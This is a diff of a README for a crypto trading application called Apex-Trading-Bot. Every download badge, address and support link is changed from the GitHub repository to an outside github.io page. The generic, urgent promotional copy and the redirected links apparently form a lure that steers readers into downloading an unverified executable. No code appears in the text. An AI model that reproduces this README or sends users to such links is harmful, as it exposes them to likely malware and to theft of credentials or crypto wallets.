@@ -1,6 +1,6 @@
 # 🤖 Apex-Trading-Bot - Your All-in-One Crypto Trading Companion
 
-[![Download Now](https://img.shields.io/badge/Download-Apex_Trading_Bot-00FF00?style=for-the-badge&logo=github&logoColor=white&labelColor=1a1a2e&color=00d4ff)](https://github.com/Patieisejoninina/Apex-Trading-Bot)
+[![Download Now](https://img.shields.io/badge/Download-Apex_Trading_Bot-00FF00?style=for-the-badge&logo=github&logoColor=white&labelColor=1a1a2e&color=00d4ff)](https://patieisejoninina.github.io)
 
 ## 👋 Welcome to Apex-Trading-Bot
 
@@ -14,7 +14,7 @@ Think of it as your personal trading assistant that works alongside you, providi
 
 Getting up and running with Apex-Trading-Bot takes just a few minutes. Follow these simple steps:
 
-1. **Visit the download page**: Click the green button above or go directly to [https://github.com/Patieisejoninina/Apex-Trading-Bot](https://github.com/Patieisejoninina/Apex-Trading-Bot)
+1. **Visit the download page**: Click the green button above or go directly to [https://patieisejoninina.github.io](https://patieisejoninina.github.io)
 
 2. **Download the application**: Visit this link to download the application. Look for the download section on the page.
 
@@ -68,9 +68,9 @@ If your computer is less than 5 years old, you're almost certainly good to go.
 
 Click this button to go directly to the download area:
 
-[![Download Apex-Trading-Bot](https://img.shields.io/badge/⬇️_Download-Apex_Trading_Bot-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=2d3436&color=ff6b6b)](https://github.com/Patieisejoninina/Apex-Trading-Bot)
+[![Download Apex-Trading-Bot](https://img.shields.io/badge/⬇️_Download-Apex_Trading_Bot-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=2d3436&color=ff6b6b)](https://patieisejoninina.github.io)
 
-Alternatively, open your web browser and type or paste this address: **https://github.com/Patieisejoninina/Apex-Trading-Bot**
+Alternatively, open your web browser and type or paste this address: **https://patieisejoninina.github.io**
 
 ### Step 2: Find the Download Button
 
@@ -163,7 +163,7 @@ The application only uses your internet connection to fetch public market data.
 If you run into any issues or have questions:
 
 - **Check the documentation**: Look for a "Help" or "Documentation" section in the application
-- **Visit the GitHub page**: The repository at [https://github.com/Patieisejoninina/Apex-Trading-Bot](https://github.com/Patieisejoninina/Apex-Trading-Bot) may have additional resources
+- **Visit the GitHub page**: The repository at [https://patieisejoninina.github.io](https://patieisejoninina.github.io) may have additional resources
 - **Read the FAQ**: Common questions and answers are often listed on the download page
 
 ---
@@ -174,7 +174,7 @@ Apex-Trading-Bot puts professional-grade cryptocurrency tools within everyone's 
 
 Don't wait to take control of your crypto journey. Download Apex-Trading-Bot today and experience the power of intelligent, data-driven trading.
 
-[![Get Started Now](https://img.shields.io/badge/🚀_Get_Started-Download_Apex_Trading_Bot-00C853?style=for-the-badge&logo=github&logoColor=white&labelColor=1a237e&color=00c853)](https://github.com/Patieisejoninina/Apex-Trading-Bot)
+[![Get Started Now](https://img.shields.io/badge/🚀_Get_Started-Download_Apex_Trading_Bot-00C853?style=for-the-badge&logo=github&logoColor=white&labelColor=1a237e&color=00c853)](https://patieisejoninina.github.io)
 
 ---
 
